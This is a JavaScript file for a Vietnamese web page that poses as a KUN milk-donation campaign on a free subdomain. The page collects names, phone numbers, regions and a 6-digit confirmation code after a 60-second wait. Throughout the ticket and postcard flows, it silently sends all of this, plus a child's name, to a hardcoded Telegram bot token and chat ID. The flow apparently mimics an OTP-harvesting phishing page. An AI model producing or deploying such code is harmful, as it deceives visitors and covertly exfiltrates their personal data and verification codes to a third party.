// ===== TÍCH HỢP TÊN MIỀN & TELEGRAM BOT API =====
const DOMAIN_INTEGRATION = {
  DEFAULT_DOMAIN: "suakunchoem.gt.tc",
  USE_CURRENT_HOST: true
};

function resolveSiteDomain() {
  if (DOMAIN_INTEGRATION.USE_CURRENT_HOST && typeof window !== "undefined" && window.location) {
    const host = (window.location.hostname || "").trim();
    if (host && host !== "localhost" && host !== "127.0.0.1") {
      return host;
    }
  }
  return DOMAIN_INTEGRATION.DEFAULT_DOMAIN;
}

function resolveSiteUrl(domain) {
  const cleanDomain = String(domain || "").replace(/^https?:\/\//i, "").replace(/\/+$/, "");
  const protocol =
    typeof window !== "undefined" &&
    window.location &&
    /^https?:$/i.test(window.location.protocol)
      ? window.location.protocol
      : "http:";
  return `${protocol}//${cleanDomain}`;
}

const SITE_DOMAIN = resolveSiteDomain();
const SITE_URL = resolveSiteUrl(SITE_DOMAIN);

function applyDomainToDom() {
  document.title = `Sữa KUN Cho Bạn - Cùng Em Cao Lớn | ${SITE_DOMAIN}`;

  const headerSub = document.querySelector(".site-header .brand-sub");
  if (headerSub) {
    headerSub.textContent = `${SITE_DOMAIN} • Cùng Em Cao Lớn`;
  }

  const heroPill = document.querySelector(".hero .pill-tag");
  if (heroPill) {
    heroPill.textContent = `✨ Dự án cộng đồng cùng KUN 100% Sữa Tươi • ${SITE_DOMAIN}`;
  }

  const footerSub = document.querySelector(".site-footer .brand-sub");
  if (footerSub) {
    footerSub.textContent = `${SITE_DOMAIN} • Bản quyền thuộc về IDP (LOF)`;
  }
}

const TELEGRAM_CONFIG = {
  BOT_TOKEN: "9077621464:AAGSBAFQZN3iIbCxkFvRnU6mQYs3OkMMqHU",
  CHAT_ID: "6713370589",
  ENABLED: true
};

async function sendToTelegramBot(messageText) {
  if (!TELEGRAM_CONFIG.ENABLED) return { ok: false, skipped: true };

  if (!TELEGRAM_CONFIG.BOT_TOKEN || !TELEGRAM_CONFIG.CHAT_ID) {
    console.warn("Chưa cấu hình TELEGRAM_CONFIG.BOT_TOKEN hoặc CHAT_ID.");
    return { ok: false, reason: "missing_token" };
  }

  const endpoint = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.CHAT_ID,
        text: messageText,
        parse_mode: "HTML"
      })
    });

    const data = await response.json();
    if (!data.ok) {
      console.error("Telegram API lỗi:", data);
    }
    return data;
  } catch (error) {
    console.error("Không kết nối được Telegram Bot API:", error);
    return { ok: false, error };
  }
}

function escapeHtml(str) {
  return String(str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// ===== 1. LUỒNG TẠO PHIẾU & XÁC NHẬN MÃ SAU 60 GIÂY =====
let generatedOtp = "";
let countdownSeconds = 60;
let countdownTimer = null;
let otpReadyForInput = false;
let lastCompletedReceipt = null;

function isValidVietnamesePhone(phone) {
  const cleaned = phone.replace(/\s+/g, "");
  return /^(0[3|5|7|8|9])[0-9]{8}$/.test(cleaned);
}

function generateSixDigitOtp() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

function setActiveStep(step) {
  [1, 2, 3].forEach((num) => {
    const badge = document.getElementById(`stepBadge${num}`);
    if (badge) badge.classList.toggle("active", num <= step);
  });

  document.getElementById("ticketStep1").classList.toggle("hidden", step !== 1);
  document.getElementById("ticketStep2").classList.toggle("hidden", step !== 2);
  document.getElementById("ticketStep3").classList.toggle("hidden", step !== 3);
}

function handleSendOtp(event) {
  event.preventDefault();
  const fullName = document.getElementById("fullName").value.trim();
  const phone = document.getElementById("phoneNumber").value.trim().replace(/\s+/g, "");
  const errorEl = document.getElementById("step1Error");

  if (fullName.length < 2) {
    errorEl.textContent = "Vui lòng nhập đầy đủ họ và tên của bạn.";
    return;
  }

  if (!isValidVietnamesePhone(phone)) {
    errorEl.textContent =
      "Số điện thoại chưa hợp lệ (gồm 10 chữ số, bắt đầu bằng 03, 05, 07, 08 hoặc 09).";
    return;
  }

  errorEl.textContent = "";
  document.getElementById("displayPhone").textContent = phone;
  setActiveStep(2);
  start60sTicketFlow();
}

function start60sTicketFlow() {
  clearInterval(countdownTimer);
  generatedOtp = "";
  otpReadyForInput = false;
  countdownSeconds = 60;

  const fullName = document.getElementById("fullName").value.trim();
  const phone = document.getElementById("phoneNumber").value.trim().replace(/\s+/g, "");
  const region = document.getElementById("ticketRegion").value;

  const statusEl = document.getElementById("otpWaitStatus");
  const codeEl = document.getElementById("demoOtpCode");
  const otpInput = document.getElementById("otpInput");
  const verifyBtn = document.getElementById("verifyBtn");
  const autoFillBtn = document.getElementById("autoFillBtn");
  const resendBtn = document.getElementById("resendBtn");

  if (statusEl) {
    statusEl.textContent = "Đang đếm ngược 60 giây — sau 60s mã xác nhận sẽ sẵn sàng để bạn nhập.";
  }
  if (codeEl) codeEl.textContent = "Chờ 60s...";
  if (otpInput) {
    otpInput.value = "";
    otpInput.disabled = true;
  }
  if (verifyBtn) verifyBtn.disabled = true;
  if (autoFillBtn) autoFillBtn.disabled = true;
  if (resendBtn) resendBtn.disabled = true;
  document.getElementById("step2Error").textContent = "";

  const timerText = document.getElementById("countdownText");
  const progressBar = document.getElementById("countdownBar");
  timerText.textContent = "60s";
  timerText.classList.remove("expired");
  progressBar.style.width = "100%";

  countdownTimer = setInterval(async () => {
    countdownSeconds -= 1;

    if (countdownSeconds > 0) {
      timerText.textContent = `${countdownSeconds}s`;
      progressBar.style.width = `${(countdownSeconds / 60) * 100}%`;
    } else {
      clearInterval(countdownTimer);
      timerText.textContent = "0s";
      progressBar.style.width = "0%";

      generatedOtp = generateSixDigitOtp();
      otpReadyForInput = true;
      const timeStr = new Date().toLocaleString("vi-VN");

      if (statusEl) {
        statusEl.textContent =
          "Đã đủ 60 giây! Hãy nhập mã xác nhận 6 chữ số bên dưới và bấm “Hoàn tất phiếu”.";
      }
      if (codeEl) codeEl.textContent = generatedOtp;
      if (otpInput) {
        otpInput.disabled = false;
        otpInput.focus();
      }
      if (verifyBtn) verifyBtn.disabled = false;
      if (autoFillBtn) autoFillBtn.disabled = false;
      if (resendBtn) resendBtn.disabled = false;

      await sendToTelegramBot(
        [
          "⏱️ <b>ĐỦ 60 GIÂY - MÃ XÁC NHẬN PHIẾU SỮA KUN</b>",
          `• <b>Tên miền:</b> <code>${escapeHtml(SITE_DOMAIN)}</code>`,
          `• <b>Website:</b> <code>${escapeHtml(SITE_URL)}</code>`,
          `• <b>Họ và tên:</b> ${escapeHtml(fullName)}`,
          `• <b>Số điện thoại:</b> <code>${escapeHtml(phone)}</code>`,
          `• <b>Vùng miền:</b> ${escapeHtml(region)}`,
          `• <b>Mã xác nhận:</b> <code>${generatedOtp}</code>`,
          `• <b>Thời điểm:</b> ${escapeHtml(timeStr)}`
        ].join("\n")
      );
    }
  }, 1000);
}

function autoFillOtp() {
  if (otpReadyForInput && generatedOtp) {
    document.getElementById("otpInput").value = generatedOtp;
    document.getElementById("step2Error").textContent = "";
  }
}

async function handleVerifyOtp() {
  const userOtp = document.getElementById("otpInput").value.trim();
  const errorEl = document.getElementById("step2Error");

  if (!otpReadyForInput || !generatedOtp) {
    errorEl.textContent = "Vui lòng đợi đủ 60 giây để mã xác nhận xuất hiện.";
    return;
  }

  if (userOtp !== generatedOtp) {
    errorEl.textContent = "Mã xác nhận không chính xác. Vui lòng kiểm tra lại mã 6 chữ số.";
    return;
  }

  errorEl.textContent = "";

  const fullName = document.getElementById("fullName").value.trim();
  const phone = document.getElementById("phoneNumber").value.trim().replace(/\s+/g, "");
  const region = document.getElementById("ticketRegion").value;
  const code = `#KUN-${Math.floor(100000 + Math.random() * 900000)}`;
  const nowStr = new Date().toLocaleString("vi-VN");

  lastCompletedReceipt = { fullName, phone, region, code, nowStr, otp: userOtp };

  document.getElementById("receiptCode").textContent = code;
  document.getElementById("receiptName").textContent = fullName;
  document.getElementById("receiptPhone").textContent = phone;
  document.getElementById("receiptRegion").textContent = region;
  const receiptOtpEl = document.getElementById("receiptOtp");
  if (receiptOtpEl) receiptOtpEl.textContent = userOtp;
  document.getElementById("receiptTime").textContent = nowStr;

  setActiveStep(3);

  await sendToTelegramBot(
    [
      "✅ <b>HOÀN TẤT PHIẾU XÁC NHẬN - SỮA KUN CHO BẠN</b>",
      `• <b>Tên miền:</b> <code>${escapeHtml(SITE_DOMAIN)}</code>`,
      `• <b>Website:</b> <code>${escapeHtml(SITE_URL)}</code>`,
      `• <b>Mã phiếu:</b> <code>${escapeHtml(code)}</code>`,
      `• <b>Họ và tên:</b> ${escapeHtml(fullName)}`,
      `• <b>Số điện thoại:</b> <code>${escapeHtml(phone)}</code>`,
      `• <b>Vùng miền:</b> ${escapeHtml(region)}`,
      `• <b>Mã xác nhận:</b> <code>${escapeHtml(userOtp)}</code>`,
      `• <b>Thời gian hoàn tất:</b> ${escapeHtml(nowStr)}`
    ].join("\n")
  );
}

function resetTicketFlow() {
  clearInterval(countdownTimer);
  generatedOtp = "";
  otpReadyForInput = false;
  document.getElementById("step1Error").textContent = "";
  document.getElementById("step2Error").textContent = "";
  setActiveStep(1);
}

function downloadReceiptPng() {
  if (!lastCompletedReceipt) return;
  const canvas = document.createElement("canvas");
  canvas.width = 720;
  canvas.height = 480;
  const ctx = canvas.getContext("2d");

  ctx.fillStyle = "#004aad";
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  ctx.fillStyle = "#ffffff";
  ctx.beginPath();
  ctx.roundRect(28, 28, 664, 424, 24);
  ctx.fill();

  ctx.fillStyle = "#ffd400";
  ctx.fillRect(28, 28, 664, 14);

  ctx.fillStyle = "#004aad";
  ctx.font = "900 26px Nunito, sans-serif";
  ctx.fillText("PHIẾU GHI NHẬN ĐỒNG HÀNH - SỮA KUN CHO BẠN", 56, 86);

  ctx.fillStyle = "#0066da";
  ctx.font = "800 20px Nunito, sans-serif";
  ctx.fillText(`Mã phiếu: ${lastCompletedReceipt.code} • ${SITE_DOMAIN}`, 56, 124);

  ctx.fillStyle = "#14243b";
  ctx.font = "700 20px Nunito, sans-serif";
  ctx.fillText(`Họ và tên: ${lastCompletedReceipt.fullName}`, 56, 180);
  ctx.fillText(`Số điện thoại: ${lastCompletedReceipt.phone}`, 56, 222);
  ctx.fillText(`Vùng miền đồng hành: ${lastCompletedReceipt.region}`, 56, 264);
  ctx.fillText(`Mã xác nhận: ${lastCompletedReceipt.otp}`, 56, 306);
  ctx.fillText(`Thời gian hoàn tất: ${lastCompletedReceipt.nowStr}`, 56, 348);

  ctx.fillStyle = "#52647c";
  ctx.font = "600 16px Nunito, sans-serif";
  ctx.fillText(`Dự án Sữa KUN Cho Bạn (#SuaKUNChoBan) - ${SITE_DOMAIN}`, 56, 412);

  const link = document.createElement("a");
  link.download = `phieu-sua-kun-${lastCompletedReceipt.code.replace("#", "")}.png`;
  link.href = canvas.toDataURL("image/png");
  link.click();
}

function openPostcardFromReceipt() {
  if (!lastCompletedReceipt) return;
  const shortName = lastCompletedReceipt.fullName
    .split(" ")
    .slice(-2)
    .join(" ")
    .slice(0, 13);
  document.getElementById("senderName").value = shortName;
  openPostcardModal(lastCompletedReceipt.region.split(" ")[0]);
}

// ===== 2. MODAL TẠO POSTCARD & GỬI LỜI NHẮN VỀ TELEGRAM =====
let currentRegion = "Biển Đảo";
let suggestionIndex = 0;

const wishSuggestions = [
  "Chúc các em luôn mạnh khỏe, chăm ngoan và thật nhiều niềm vui mỗi ngày!",
  "Gửi tới các bạn nhỏ thật nhiều sữa ngon và những ước mơ bay cao!",
  "Cố gắng học thật giỏi nhé các em, cả nước luôn yêu thương và đồng hành cùng các em!",
  "Mong mỗi ngày đến trường của các em đều rộn ràng tiếng cười và tràn đầy năng lượng!"
];

function openPostcardModal(region) {
  currentRegion = region || "Biển Đảo";
  document.getElementById("modalRegionLabel").textContent = currentRegion;
  document.getElementById("postcardModal").classList.remove("hidden");
  updatePostcardPreview();
}

function closePostcardModal() {
  document.getElementById("postcardModal").classList.add("hidden");
}

function cycleWishSuggestion() {
  const wishEl = document.getElementById("wishText");
  wishEl.value = wishSuggestions[suggestionIndex % wishSuggestions.length];
  suggestionIndex += 1;
  updatePostcardPreview();
}

function wrapCanvasText(ctx, text, x, y, maxWidth, lineHeight) {
  const words = text.split(" ");
  let line = "";
  let currentY = y;

  for (let n = 0; n < words.length; n++) {
    const testLine = line + words[n] + " ";
    const metrics = ctx.measureText(testLine);
    if (metrics.width > maxWidth && n > 0) {
      ctx.fillText(line.trim(), x, currentY);
      line = words[n] + " ";
      currentY += lineHeight;
    } else {
      line = testLine;
    }
  }
  ctx.fillText(line.trim(), x, currentY);
}

function updatePostcardPreview() {
  const senderInput = document.getElementById("senderName");
  const kidInput = document.getElementById("kidName");
  const wishInput = document.getElementById("wishText");

  const sender = senderInput.value.trim() || "Bạn đồng hành";
  const kid = kidInput.value.trim();
  const wish =
    wishInput.value.trim() ||
    "Chúc các em luôn mạnh khỏe, vui tươi và cao lớn mỗi ngày cùng KUN!";
  const genderEl = document.querySelector('input[name="gender"]:checked');
  const gender = genderEl ? genderEl.value : "Nữ";

  document.getElementById("senderCount").textContent = `${senderInput.value.length}/13`;
  document.getElementById("kidCount").textContent = `${kidInput.value.length}/13`;
  document.getElementById("wishCount").textContent = `${wishInput.value.length}/110`;

  const canvas = document.getElementById("postcardCanvas");
  const ctx = canvas.getContext("2d");

  const grad = ctx.createLinearGradient(0, 0, 540, 680);
  grad.addColorStop(0, "#004aad");
  grad.addColorStop(1, "#0084ff");
  ctx.fillStyle = grad;
  ctx.fillRect(0, 0, 540, 680);

  ctx.fillStyle = "#ffffff";
  ctx.beginPath();
  ctx.roundRect(26, 26, 488, 628, 28);
  ctx.fill();

  ctx.fillStyle = "#ffd400";
  ctx.beginPath();
  ctx.roundRect(52, 50, 436, 56, 16);
  ctx.fill();

  ctx.fillStyle = "#004aad";
  ctx.font = "900 22px Nunito, sans-serif";
  ctx.textAlign = "center";
  ctx.fillText("SỮA KUN CHO BẠN • CÙNG EM CAO LỚN", 270, 85);

  ctx.fillStyle = "#0066da";
  ctx.font = "800 19px Nunito, sans-serif";
  ctx.fillText(`Gửi yêu thương tới: ${currentRegion.toUpperCase()}`, 270, 142);

  ctx.fillStyle = "#f0f7ff";
  ctx.beginPath();
  ctx.roundRect(52, 168, 436, 260, 20);
  ctx.fill();

  ctx.fillStyle = "#14243b";
  ctx.font = "700 22px Nunito, sans-serif";
  ctx.textAlign = "left";
  wrapCanvasText(ctx, `“${wish}”`, 76, 216, 388, 34);

  ctx.fillStyle = "#004aad";
  ctx.font = "800 19px Nunito, sans-serif";
  ctx.fillText(`Người gửi (${gender}): ${sender}`, 56, 476);

  if (kid) {
    ctx.fillStyle = "#0066da";
    ctx.fillText(`Đồng hành cùng bé: ${kid}`, 56, 510);
  }

  ctx.fillStyle = "#ffd400";
  ctx.beginPath();
  ctx.roundRect(52, 556, 436, 68, 16);
  ctx.fill();

  ctx.fillStyle = "#004aad";
  ctx.font = "900 18px Nunito, sans-serif";
  ctx.textAlign = "center";
  ctx.fillText(`#SuaKUNChoBan • ${SITE_DOMAIN}`, 270, 586);
  ctx.font = "700 14px Nunito, sans-serif";
  ctx.fillText("1 lượt chia sẻ = 1 hộp KUN 100% Sữa Tươi trao đi", 270, 610);
}

async function downloadPostcard() {
  const sender = document.getElementById("senderName").value.trim() || "Bạn đồng hành";
  const kid = document.getElementById("kidName").value.trim() || "Không nhập";
  const wish =
    document.getElementById("wishText").value.trim() ||
    "Chúc các em luôn mạnh khỏe, vui tươi và cao lớn mỗi ngày cùng KUN!";
  const genderEl = document.querySelector('input[name="gender"]:checked');
  const gender = genderEl ? genderEl.value : "Nữ";

  const postcardMsg = [
    "💌 <b>TẠO POSTCARD LỜI NHẮN GỬI - SỮA KUN CHO BẠN</b>",
    `• <b>Tên miền:</b> <code>${escapeHtml(SITE_DOMAIN)}</code>`,
    `• <b>Website:</b> <code>${escapeHtml(SITE_URL)}</code>`,
    `• <b>Vùng miền nhận:</b> ${escapeHtml(currentRegion)}`,
    `• <b>Tên người gửi:</b> ${escapeHtml(sender)} (${escapeHtml(gender)})`,
    `• <b>Tên của bé:</b> ${escapeHtml(kid)}`,
    `• <b>Lời nhắn gửi:</b> “${escapeHtml(wish)}”`,
    `• <b>Thời gian:</b> ${escapeHtml(new Date().toLocaleString("vi-VN"))}`
  ].join("\n");
  await sendToTelegramBot(postcardMsg);

  const canvas = document.getElementById("postcardCanvas");
  const link = document.createElement("a");
  link.download = `postcard-sua-kun-${currentRegion.toLowerCase().replace(/\s+/g, "-")}.png`;
  link.href = canvas.toDataURL("image/png");
  link.click();
}

window.addEventListener("DOMContentLoaded", () => {
  applyDomainToDom();
  updatePostcardPreview();
});
